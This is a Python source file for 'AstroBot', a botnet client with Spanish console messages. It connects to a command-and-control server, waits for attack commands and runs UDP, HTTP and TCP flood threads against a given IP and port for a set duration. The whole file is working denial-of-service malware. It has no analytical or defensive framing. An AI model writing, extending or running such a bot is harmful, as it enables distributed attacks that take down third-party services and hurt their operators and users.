#!/usr/bin/env python3
import socket
import random
import time
import threading

class AstroBot:
    def __init__(self, cnc_ip, cnc_port):
        self.cnc_ip = cnc_ip
        self.cnc_port = cnc_port
        self.running = True
        self.attack_threads = []
        self.stop_attack = False
    
    def connect_to_cnc(self):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.cnc_ip, self.cnc_port))
                print("[+] Conectado al CNC")
                self.handle_commands(s)
            except Exception as e:
                print(f"[-] Error de conexión: {str(e)}")
                time.sleep(10)
    
    def handle_commands(self, sock):
        try:
            while self.running:
                # Enviar ping para mantener la conexión
                sock.send("ping".encode())
                
                # Recibir comandos
                data = sock.recv(1024).decode().strip()
                if not data:
                    break
                
                if data == "pong":
                    continue
                
                print(f"[+] Comando recibido: {data}")
                
                if data.startswith("attack"):
                    parts = data.split()
                    attack_type = parts[1]
                    ip = parts[2]
                    port = int(parts[3])
                    duration = int(parts[4])
                    
                    self.stop_attack = False
                    
                    if attack_type == "udp":
                        t = threading.Thread(target=self.udp_flood, args=(ip, port, duration))
                    elif attack_type == "http":
                        path = parts[5] if len(parts) > 5 else "/"
                        t = threading.Thread(target=self.http_flood, args=(ip, port, duration, path))
                    elif attack_type == "tcp":
                        t = threading.Thread(target=self.tcp_flood, args=(ip, port, duration))
                    
                    t.start()
                    self.attack_threads.append(t)
                    
        except Exception as e:
            print(f"[-] Error: {str(e)}")
        finally:
            sock.close()
    
    def udp_flood(self, ip, port, duration):
        end_time = time.time() + duration
        while time.time() < end_time and not self.stop_attack:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = random._urandom(1024)
                s.sendto(payload, (ip, port))
                s.close()
            except:
                pass
    
    def http_flood(self, ip, port, duration, path="/"):
        end_time = time.time() + duration
        while time.time() < end_time and not self.stop_attack:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                request = f"GET {path} HTTP/1.1\r\nHost: {ip}\r\n\r\n"
                s.send(request.encode())
                s.close()
            except:
                pass
    
    def tcp_flood(self, ip, port, duration):
        end_time = time.time() + duration
        while time.time() < end_time and not self.stop_attack:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.close()
            except:
                pass
    
    def start(self):
        print("""
         ___    _____________  _____  ____   _____ 
        /   |  / ____/ ___/ / / / _ \/ __ \ / ___/
       / /| | / /_   / __ \/ / / / __/ / / / __ \ 
      / ___ |/ __/  / /_/ / /_/ / /_/ /_/ / /_/ /
     /_/  |_/_/     \____/\____/\__/\____/\____/  
                                                  
        """)
        print(f"[*] Conectando a {self.cnc_ip}:{self.cnc_port}")
        self.connect_to_cnc()

def main():
    cnc_ip = input("Ingrese la IP del CNC: ")
    cnc_port = int(input("Ingrese el puerto del CNC: "))
    
    bot = AstroBot(cnc_ip, cnc_port)
    bot.start()

if __name__ == "__main__":
    main()